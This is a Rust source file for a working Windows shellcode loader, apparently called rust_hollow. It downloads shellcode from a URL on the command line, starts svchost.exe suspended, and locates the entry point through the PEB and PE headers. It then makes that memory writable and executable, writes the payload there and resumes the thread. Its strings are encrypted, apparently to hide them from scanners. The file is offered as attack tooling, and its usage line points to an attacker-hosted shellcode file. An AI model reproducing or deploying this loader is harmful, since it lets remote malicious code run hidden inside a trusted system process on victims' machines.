
use bindings::{
    Windows::Win32::System::Threading::{CreateProcessA,NtQueryInformationProcess,ResumeThread,STARTUPINFOA,
        PROCESS_INFORMATION,PROCESS_CREATION_FLAGS,PROCESSINFOCLASS,PROCESS_BASIC_INFORMATION},
    Windows::Win32::Security::SECURITY_ATTRIBUTES,
    Windows::Win32::Foundation::PSTR,
    Windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory,WriteProcessMemory},
    Windows::Win32::System::Memory::{VirtualProtectEx,PAGE_PROTECTION_FLAGS},     
};

use reqwest;
use std::{env, ffi::CString};
use std::ptr;
use core::ffi::c_void;
use std::mem::size_of;

#[macro_use]
extern crate litcrypt;

use_litcrypt!();


fn main() {
    

    let args = parse_args();
    let mut sc= vec![];

    match args {
        Some(x) => sc = x,
        None => {println!("{}", lc!("[-] Exiting!")); return;},
    }

    unsafe
    {

        let lpapplicationname = PSTR{0: ptr::null_mut() as *mut u8};
        let name = CString::new(lc!("C:\\Windows\\System32\\svchost.exe")).expect(&*lc!("CString::new failed"));
        let lpcommandline = PSTR{0: name.as_ptr() as *mut u8};
        let lpprocessattributes:*mut SECURITY_ATTRIBUTES = std::mem::transmute(&SECURITY_ATTRIBUTES::default());
        let lpthreadattributes:*mut SECURITY_ATTRIBUTES = std::mem::transmute(&SECURITY_ATTRIBUTES::default());
        let dwcreationflags = PROCESS_CREATION_FLAGS::from(0x4);
        let lpenvironment: *mut c_void =  std::mem::transmute(ptr::null_mut() as *mut c_void);
        let lpcurrentdirectory = PSTR{0: ptr::null_mut() as *mut u8};
        let startup_info = STARTUPINFOA::default();
        let process_information = PROCESS_INFORMATION::default();
        let lpstartupinfo: *mut STARTUPINFOA =  std::mem::transmute(&startup_info);
        let lpprocessinformation: *mut PROCESS_INFORMATION =  std::mem::transmute(&process_information);

        let ret = CreateProcessA(
            lpapplicationname,
            lpcommandline, 
            lpprocessattributes, 
            lpthreadattributes, 
            false, 
            dwcreationflags, 
            lpenvironment, 
            lpcurrentdirectory, 
            lpstartupinfo, 
            lpprocessinformation);

        if ret == false {println!("{}",lc!("[x] Error creating the new process!")); return;}
        
        let processinformation: *mut c_void = std::mem::transmute(&PROCESS_BASIC_INFORMATION::default());

        let _err = NtQueryInformationProcess(
            (*lpprocessinformation).hProcess, 
            PROCESSINFOCLASS::from(0), 
            processinformation, 
            size_of::<PROCESS_BASIC_INFORMATION>() as u32, 
            ptr::null_mut() as *mut u32);
        
        let process_information_ptr: *mut PROCESS_BASIC_INFORMATION = std::mem::transmute(processinformation);
        println!("{}{}",lc!("[-] New process spawned. PID: "), (*process_information_ptr).UniqueProcessId);
        println!("{}{:X}",lc!("[-] PEB base address: 0x"), (*process_information_ptr).PebBaseAddress as u32);


        let ptr_to_image_base:*mut i64 = ((*process_information_ptr).PebBaseAddress as i64 + 0x10) as *mut i64;
        let lpbaseaddress: *const c_void = std::mem::transmute(ptr_to_image_base);
        let buffer: [u8; 8] = [0; 8];
        let lpbuffer: *mut c_void = std::mem::transmute(&buffer);

        let read = ReadProcessMemory(
            (*lpprocessinformation).hProcess, 
            lpbaseaddress, 
            lpbuffer, 
            buffer.len(), 
            ptr::null_mut());
        
        if read == false {println!("{}",lc!("[x] Error obtaining file image base address!")); return;}
        
        let svchost:*mut i64 =  std::mem::transmute(lpbuffer);   
        let svchost_base: *mut i64 = (*svchost) as *mut i64;
        println!("{}{:X}", lc!("[-] File image base address: 0x"), svchost_base as u64); 
        
        let lpbaseaddress: *const c_void = std::mem::transmute(svchost_base);
        let buffer: [u8; 300] = [0; 300]; // Con 200 bytes no es suficiente
        let lpbuffer: *mut c_void = std::mem::transmute(&buffer);
        
        let read = ReadProcessMemory(
            (*lpprocessinformation).hProcess, 
            lpbaseaddress, 
            lpbuffer, 
            buffer.len(), 
            ptr::null_mut());

        if read == false {println!("{}",lc!("[x] Error parsing PE headers!")); return;}

        let svchost_base_address:*mut i64 =  std::mem::transmute(lpbuffer);  
        let e_lfanew_offset = *((svchost_base_address as i64 + 0x3C) as *mut i32);
        let opthdr: i64 = e_lfanew_offset as i64 + 0x28 as i64;
        let entrypoint_rva: u32 = *((svchost_base_address as i64 + opthdr as i64) as *mut u32);
        let entrypoint_address: *mut u32 = (entrypoint_rva as i64 + svchost_base as i64) as *mut u32;
        
        println!("{}{:X}",lc!("[-] Entry point address: 0x"), entrypoint_address as u64); 

        //let sc = download_shellcode(url.to_string());
        let lpbaseaddress: *mut c_void = std::mem::transmute(entrypoint_address);
        let lpbuffer: *mut c_void = std::mem::transmute(sc.as_ptr());
        let lpfloldprotect: *mut PAGE_PROTECTION_FLAGS = std::mem::transmute(&PAGE_PROTECTION_FLAGS::default());

        let mut flnewprotect = PAGE_PROTECTION_FLAGS::default();
        flnewprotect.0 = 0x40;

        let protection = VirtualProtectEx(
            (*lpprocessinformation).hProcess, 
            lpbaseaddress, 
            sc.len() as usize, 
            flnewprotect, 
            lpfloldprotect);

        if protection == false {println!("{}",lc!("[x] Error changing memory protections!")); return;}

        let write = WriteProcessMemory(
            (*lpprocessinformation).hProcess, 
            lpbaseaddress, 
            lpbuffer, 
            sc.len() as usize, 
            ptr::null_mut());
        
        if write == false {println!("{}",lc!("[x] Error writing shellcode to remote process!")); return;}
        
        let tmp: *mut PAGE_PROTECTION_FLAGS = std::mem::transmute(&PAGE_PROTECTION_FLAGS::default());

        let protection = VirtualProtectEx(
            (*lpprocessinformation).hProcess, 
            lpbaseaddress, 
            sc.len() as usize, 
            *lpfloldprotect, 
            tmp);
        
        if protection == false {println!("{}",lc!("[x] Error changing memory protections!"));}
        
        let _resume = ResumeThread((*lpprocessinformation).hThread);
        
        println!("{}",lc!("[-] Main thread properly resumed. Good luck!"));
    
    }
    
}

fn parse_args() -> Option<Vec<u8>> {

    let args: Vec<String> = env::args().collect();

    if args.len() < 2
    {   

        println!("{}",lc!("[x] Insufficient number of arguments!"));
        print_help();
        return None;

    } else if args [1] == "-h" {

        print_help();
        return None;

    }

    let url = &args[1];

    let sc = download_shellcode(url.to_string());

    Some(sc)
}

fn print_help () {
    
    let s = lc!("
[*] Usage: rust_hollow.exe http://yourip/yourshellcode.bin
           rust_hollow.exe -h
           ");
    
    println!("{}", s);
}

fn download_shellcode(url: String) -> Vec<u8>  {

    let response = reqwest::blocking::get(url).unwrap();
    let sc = response.bytes().unwrap();
    sc.to_vec()
}
